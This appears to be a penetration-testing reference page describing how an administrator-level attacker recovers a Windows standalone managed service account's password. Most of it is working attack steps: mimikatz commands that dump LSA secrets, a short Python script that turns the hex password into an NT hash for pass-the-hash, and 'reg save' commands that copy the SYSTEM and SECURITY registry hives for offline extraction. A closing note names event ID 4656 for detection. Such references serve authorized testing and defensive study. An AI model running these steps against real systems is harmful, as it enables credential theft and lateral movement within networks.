An actor with administrative privileges on the computer can retrieve the sMSA’s password by dumping LSA secrets.

## Abuse Info

From an elevated command prompt on the computer where the sMSA resides, run mimikatz then execute the following commands:

```bash
privilege::debug
token::elevate
lsadump::secrets
```

In the output, find _\_SC\_\{262E99C9-6160-4871-ACEC-4E61736B6F21}__ suffixed by the name of the targeted sMSA. The next line contains _cur/hex :_ followed with the sMSA’s password hex-encoded.

To use this password, its NT hash must be calculated. This can be done using a small python script:

```bash
# nt.py
import sys, hashlib

pw_hex = sys.argv[1]
nt_hash = hashlib.new('md4', bytes.fromhex(pw_hex)).hexdigest()

print(nt_hash)
```

Execute it like so:


```bash
python3 nt.py 35f3e1713d61...
```

To authenticate as the sMSA, leverage pass-the-hash.

Alternatively, to avoid executing mimikatz on the host, you can save a copy of the _SYSTEM_ and _SECURITY_ registry hives from an elevated prompt:


```bash
reg save HKLM\SYSTEM %temp%\SYSTEM & reg save HKLM\SECURITY %temp%\SECURITY
```

Transfer the files named _SYSTEM_ and _SECURITY_ that were saved at _%temp%_ to another computer where mimikatz can be safely executed.

On this other computer, run mimikatz from a command prompt then execute the following command to obtain the hex-encoded password:

```bash
lsadump::secrets /system:C:\path\to\file\SYSTEM /security:C:\path\to\file\SECURITY
```

## Opsec Considerations

Access to registry hives can be monitored and alerted via event ID 4656 (A handle to an object was requested).
